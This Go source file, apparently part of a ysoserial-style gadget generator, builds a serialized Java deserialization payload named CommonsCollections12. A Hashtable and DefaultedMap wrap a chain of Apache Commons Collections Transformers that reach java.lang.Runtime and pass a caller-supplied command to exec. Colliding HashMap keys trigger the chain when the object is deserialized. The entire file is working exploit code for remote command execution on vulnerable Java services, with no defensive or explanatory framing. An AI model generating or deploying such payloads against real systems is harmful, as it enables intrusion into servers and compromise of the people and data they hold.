package ysoserial

func CommonsCollections12(cmd string) []byte {
	return ClassObject{
		name:             "java.util.Hashtable",
		serialVersionUID: 1421746759512286392,
		classDescFlags:   SC_WRITE_METHOD | SC_SERIALIZABLE,
		fields: []Field{
			{Float, "loadFactor", 0.75},
			{Integer, "threshold", 8},
		},
		objectAnnotations: interfaces(
			blockData{0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00, 0x02},
			ClassObject{
				name:             "org.apache.commons.collections.map.DefaultedMap",
				serialVersionUID: 19698628745827,
				classDescFlags:   SC_WRITE_METHOD | SC_SERIALIZABLE,
				fields: []Field{
					{"Ljava/lang/Object;", "value", ArrayObject{
						name:             "[Lorg.apache.commons.collections.Transformer;",
						serialVersionUID: -4803604734341277543,
						classDescFlags:   SC_SERIALIZABLE,
						values: interfaces(
							ClassObject{
								name:             "org.apache.commons.collections.functors.ConstantTransformer",
								serialVersionUID: 6374440726369055124,
								classDescFlags:   SC_SERIALIZABLE,
								fields: []Field{
									{Object, "iConstant", ClassDesc{
										name:             "java.lang.Runtime",
										serialVersionUID: 0,
										classDescFlags:   0x00,
									}},
								},
								objectAnnotations: interfaces(),
								super:             nil,
							}, ClassObject{
								name:             "org.apache.commons.collections.functors.InvokerTransformer",
								serialVersionUID: -8653385846894047688,
								classDescFlags:   SC_SERIALIZABLE,
								fields: []Field{
									{"[Ljava/lang/Object;", "iArgs", ArrayObject{
										name:             "[Ljava.lang.Object;",
										serialVersionUID: -8012369246846506644,
										classDescFlags:   SC_SERIALIZABLE,
										values: interfaces(
											ClassDesc{
												name:             "java.lang.Runtime",
												serialVersionUID: 0,
												classDescFlags:   0x00,
											}, ArrayObject{
												name:             "[Ljava.lang.Class;",
												serialVersionUID: -6118465897992725863,
												classDescFlags:   SC_SERIALIZABLE,
												values:           interfaces(),
											},
										),
									}},
									{"Ljava/lang/String;", "iMethodName", "getMethod"},
									{"[Ljava/lang/Class;", "iParamTypes", ArrayObject{
										values: interfaces(
											ClassObject{
												name:             "java.lang.String",
												serialVersionUID: -6849794470754667710,
												classDescFlags:   SC_SERIALIZABLE,
											},
										),
									},
									},
								},
								objectAnnotations: interfaces(),
								super:             nil,
							}, ClassObject{
								name:             "org.apache.commons.collections.functors.InvokerTransformer",
								serialVersionUID: -8653385846894047688,
								classDescFlags:   SC_SERIALIZABLE,
								fields: []Field{
									{"[Ljava/lang/Object;", "iArgs", ArrayObject{
										name:             "[Ljava.lang.Object;",
										serialVersionUID: -8012369246846506644,
										classDescFlags:   SC_SERIALIZABLE,
										values: interfaces(
											ClassDesc{
												name:             "java.lang.Runtime",
												serialVersionUID: 0,
												classDescFlags:   0x00,
											}, ArrayObject{
												name:             "[Ljava.lang.Class;",
												serialVersionUID: -6118465897992725863,
												classDescFlags:   SC_SERIALIZABLE,
												values:           interfaces(),
											},
										),
									}},
									{"Ljava/lang/String;", "iMethodName", "invoke"},
									{"[Ljava/lang/Class;", "iParamTypes", ArrayObject{
										values: interfaces(
											ClassObject{
												name:             "java.lang.Object",
												serialVersionUID: -6849794470754667710,
												classDescFlags:   SC_SERIALIZABLE,
											},
										),
									},
									},
								},
								objectAnnotations: interfaces(),
								super:             nil,
							}, ClassObject{
								name:             "org.apache.commons.collections.functors.InvokerTransformer",
								serialVersionUID: -8653385846894047688,
								classDescFlags:   SC_SERIALIZABLE,
								fields: []Field{
									{"[Ljava/lang/Object;", "iArgs", ArrayObject{
										name:             "[Ljava.lang.String;",
										serialVersionUID: -5921575005990323385,
										classDescFlags:   SC_SERIALIZABLE,
										values:           interfaces(cmd),
									}},
									{"Ljava/lang/String;", "iMethodName", "exec"},
									{"[Ljava/lang/Class;", "iParamTypes", ArrayObject{
										values: interfaces(
											ClassObject{
												name:             "java.lang.Object",
												serialVersionUID: -6849794470754667710,
												classDescFlags:   SC_SERIALIZABLE,
											},
										),
									},
									},
								},
								objectAnnotations: interfaces(),
								super:             nil,
							}, ClassObject{
								name:             "org.apache.commons.collections.functors.ConstantTransformer",
								serialVersionUID: 6374440726369055124,
								classDescFlags:   SC_SERIALIZABLE,
								fields: []Field{
									{Object, "iConstant", ClassObject{
										name:             "java.lang.Integer",
										serialVersionUID: 1360826667806852920,
										classDescFlags:   SC_SERIALIZABLE,
										fields: []Field{
											{Integer, "value", 1},
										},
										objectAnnotations: interfaces(),
										super: &ClassObject{
											name:              "java.lang.Number",
											serialVersionUID:  -8742448824652078965,
											classDescFlags:    SC_SERIALIZABLE,
											fields:            []Field{},
											objectAnnotations: interfaces(),
											super:             nil,
										},
									},
									},
								},
								objectAnnotations: interfaces(),
								super:             nil,
							},
						),
					},
					},
				},
				objectAnnotations: interfaces(
					ClassObject{
						name:             "java.util.HashMap",
						serialVersionUID: 362498820763181265,
						classDescFlags:   SC_WRITE_METHOD | SC_SERIALIZABLE,
						fields: []Field{
							{Float, "loadFactor", 0.75},
							{Integer, "threshold", 12},
						},
						objectAnnotations: interfaces(
							blockData{0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x01},
							ArrayObject{
								values: interfaces("yy"),
							},
						),
						super: nil,
					}, ClassObject{
						name:             "java.util.HashMap",
						serialVersionUID: 362498820763181265,
						classDescFlags:   SC_WRITE_METHOD | SC_SERIALIZABLE,
						fields: []Field{
							{Float, "loadFactor", 0.75},
							{Integer, "threshold", 12},
						},
						objectAnnotations: interfaces(
							blockData{0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x01},
							ArrayObject{
								values: interfaces("zZ"),
							},
						),
						super: nil,
					},
				),
				super: nil,
			},
		),
		super: nil,
	}.SerializeWithMagicHeader()
}
